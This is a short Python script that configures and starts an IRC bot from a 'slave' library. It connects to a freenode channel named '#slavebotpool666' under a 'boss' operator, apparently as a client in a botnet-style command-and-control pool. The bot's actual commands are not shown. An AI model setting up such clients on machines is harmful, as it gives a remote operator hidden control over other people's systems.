from slave.lib.bots import BotV2
from slave.playground.bots import BotInformation

config = {
    'host': 'chat.freenode.net',
    'port': 6667,
    'channel': "#slavebotpool666",
    'boss_name': 'boss666',
    'bot_prefix': "SLAVEBOT"
}

BotV2.read_config_from_dict(config)
BotV2.use_other_bot_commands(BotInformation)
BotV2.start()